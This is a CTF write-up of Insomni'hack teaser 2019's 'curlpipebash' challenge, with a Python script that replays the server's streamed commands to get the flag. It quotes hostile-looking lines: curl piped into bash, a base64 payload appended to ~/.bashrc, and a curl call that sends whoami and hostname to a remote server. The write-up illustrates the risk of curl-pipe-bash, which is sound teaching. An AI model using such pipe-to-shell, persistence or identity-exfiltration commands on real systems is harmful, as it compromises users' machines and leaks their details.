# curlpipebash

```
Welcome to Insomni'hack teaser 2019!

Execute this Bash command to print the flag :)

> curl -Ns https://curlpipebash.teaser.insomnihack.ch/print-flag.sh | bash
```

The request to https://curlpipebash.teaser.insomnihack.ch/print-flag.sh gives us a streamed, chunked response. That means that it will send us commands that will be executed, while itself staying alive.

This allows the server to send us different replies, depending on what endpoints we hit.

## Request flow

We start the streamed, chunked response by running

> curl -Ns https://curlpipebash.teaser.insomnihack.ch/print-flag.sh | bash

print-flag.sh replies with a new curl command that contains an UUID.

> curl -Ns https://curlpipebash.teaser.insomnihack.ch/UUID | bash

When that command is executed, print-flag.sh gives us two new commands:

> base64  -d >> ~/.bashrc <<< ZXhwb3J0IFBST01QVF9DT01NQU5EPSdlY2hvIFRIQU5LIFlPVSBGT1IgUExBWUlORyBJTlNPTU5JSEFDSyBURUFTRVIgMjAxOScK

The base64 string is `export PROMPT_COMMAND='echo THANK YOU FOR PLAYING INSOMNIHACK TEASER 2019'`

> curl -Ns https://curlpipebash.teaser.insomnihack.ch/UUID/add-to-wall-of-shame/$(whoami)%40$(hostname)`

Once these are executed, print-flag.sh gives us the final command:

> echo "Welcome to the wall of shame"

and finishes.

## Solution

What we now have to do is follow the same request pattern, but leave out the `add-to-wall-of-shame` request! The following code implements that:


```python
import requests

headers = {
    "User-Agent": "curl/7.61.0" # if it looks like curl and talks like curl...
}
 
def main():
    url = "https://curlpipebash.teaser.insomnihack.ch/print-flag.sh"
    r = requests.get(url, headers=headers, stream=True)
    for l in r.iter_lines():
        print("print-flag got line: {}".format(l))
        if "curl" in l and "shame" not in l: # We want to curl all new urls, but not the wall of shame one!
            new_link = l.split(" ")[2] # who needs regex?..
            print("Requesting new url: {}".format(new_link))
            requests.get(new_link, headers=headers)

if __name__ == "__main__":
    main()
```

When we run this:

```
# python get-flag.py 
print-flag got line: curl -Ns https://curlpipebash.teaser.insomnihack.ch/c69b5fdc-cfab-48d5-a130-8925dfdd2d26 | bash
Requesting new url: https://curlpipebash.teaser.insomnihack.ch/c69b5fdc-cfab-48d5-a130-8925dfdd2d26
print-flag got line: base64  -d >> ~/.bashrc <<< ZXhwb3J0IFBST01QVF9DT01NQU5EPSdlY2hvIFRIQU5LIFlPVSBGT1IgUExBWUlORyBJTlNPTU5JSEFDSyBURUFTRVIgMjAxOScK
print-flag got line: curl -Ns https://curlpipebash.teaser.insomnihack.ch/c69b5fdc-cfab-48d5-a130-8925dfdd2d26/add-to-wall-of-shame/$(whoami)%40$(hostname)
print-flag got line: INS{Miss me with that fishy pipe}
```

The flag is `INS{Miss me with that fishy pipe}`.